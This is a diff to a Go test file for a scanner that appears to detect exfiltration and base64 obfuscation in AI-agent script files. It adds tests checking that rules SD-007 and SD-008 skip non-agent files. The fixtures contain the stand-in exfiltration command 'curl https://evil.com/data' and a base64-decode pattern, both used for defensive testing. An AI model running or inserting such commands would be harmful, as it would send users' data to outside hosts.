@@ -94,7 +94,7 @@ func TestNetworkCallRule(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			ctx := model.FileContext{Path: "test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
+			ctx := model.FileContext{Path: ".claude/scripts/test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
 			rules := registry.RulesFor(tt.ext)
 			var findings []model.Finding
 			for _, rule := range rules {
@@ -208,7 +208,7 @@ func TestBase64ObfuscationRule(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			ctx := model.FileContext{Path: "test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
+			ctx := model.FileContext{Path: ".claude/scripts/test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
 			rules := registry.RulesFor(tt.ext)
 			var findings []model.Finding
 			for _, rule := range rules {
@@ -237,7 +237,7 @@ func TestNetworkCallFindingFields(t *testing.T) {
 	registry := NewRegistry()
 	RegisterExfiltrationRules(registry)
 
-	ctx := model.FileContext{Path: "run.sh", Ext: ".sh", Content: []byte("curl https://evil.com/data")}
+	ctx := model.FileContext{Path: ".claude/scripts/run.sh", Ext: ".sh", Content: []byte("curl https://evil.com/data")}
 	rules := registry.RulesFor(".sh")
 	var findings []model.Finding
 	for _, rule := range rules {
@@ -263,8 +263,8 @@ func TestNetworkCallFindingFields(t *testing.T) {
 	if f.RuleName != "Outbound Network Call" {
 		t.Errorf("RuleName = %q, want %q", f.RuleName, "Outbound Network Call")
 	}
-	if f.FilePath != "run.sh" {
-		t.Errorf("FilePath = %q, want %q", f.FilePath, "run.sh")
+	if f.FilePath != ".claude/scripts/run.sh" {
+		t.Errorf("FilePath = %q, want %q", f.FilePath, ".claude/scripts/run.sh")
 	}
 	if f.Line != 1 {
 		t.Errorf("Line = %d, want 1", f.Line)
@@ -281,7 +281,7 @@ func TestBase64ObfuscationFindingFields(t *testing.T) {
 	registry := NewRegistry()
 	RegisterExfiltrationRules(registry)
 
-	ctx := model.FileContext{Path: "run.sh", Ext: ".sh", Content: []byte("echo data | base64 -d")}
+	ctx := model.FileContext{Path: ".claude/scripts/run.sh", Ext: ".sh", Content: []byte("echo data | base64 -d")}
 	rules := registry.RulesFor(".sh")
 	var findings []model.Finding
 	for _, rule := range rules {
@@ -315,6 +315,38 @@ func TestBase64ObfuscationFindingFields(t *testing.T) {
 	}
 }
 
+func TestSD007_GatesNonAgentFile(t *testing.T) {
+	content := []byte("curl https://evil.com/data")
+	ctx := model.FileContext{Path: "node_modules/x/README.md", Ext: ".md", Content: content}
+	registry := NewRegistry()
+	RegisterExfiltrationRules(registry)
+	var findings []model.Finding
+	for _, r := range registry.RulesFor(".md") {
+		findings = append(findings, r.Match(content, ctx)...)
+	}
+	for _, f := range findings {
+		if f.RuleID == "SD-007" {
+			t.Errorf("SD-007 should not fire on non-agent file, got: %+v", f)
+		}
+	}
+}
+
+func TestSD008_GatesNonAgentFile(t *testing.T) {
+	content := []byte("echo data | base64 -d")
+	ctx := model.FileContext{Path: "node_modules/x/data.txt", Ext: ".txt", Content: content}
+	registry := NewRegistry()
+	RegisterExfiltrationRules(registry)
+	var findings []model.Finding
+	for _, r := range registry.RulesFor(".txt") {
+		findings = append(findings, r.Match(content, ctx)...)
+	}
+	for _, f := range findings {
+		if f.RuleID == "SD-008" {
+			t.Errorf("SD-008 should not fire on non-agent file, got: %+v", f)
+		}
+	}
+}
+
 func TestExfiltrationFixture(t *testing.T) {
 	registry := NewRegistry()
 	RegisterInjectionRules(registry)
@@ -323,12 +355,12 @@ func TestExfiltrationFixture(t *testing.T) {
 	RegisterExfiltrationRules(registry)
 	RegisterSupplyChainRules(registry)
 
-	content, err := os.ReadFile(filepath.Join("..", "..", "testdata", "malicious", "exfiltration", "exfil.sh"))
+	content, err := os.ReadFile(filepath.Join("..", "..", "testdata", "malicious", "exfiltration", ".claude", "scripts", "exfil.sh"))
 	if err != nil {
 		t.Fatalf("failed to read fixture: %v", err)
 	}
 
-	ctx := model.FileContext{Path: "exfil.sh", Ext: ".sh", Content: content}
+	ctx := model.FileContext{Path: ".claude/scripts/exfil.sh", Ext: ".sh", Content: content}
 	rules := registry.RulesFor(".sh")
 	var findings []model.Finding
 	for _, rule := range rules {
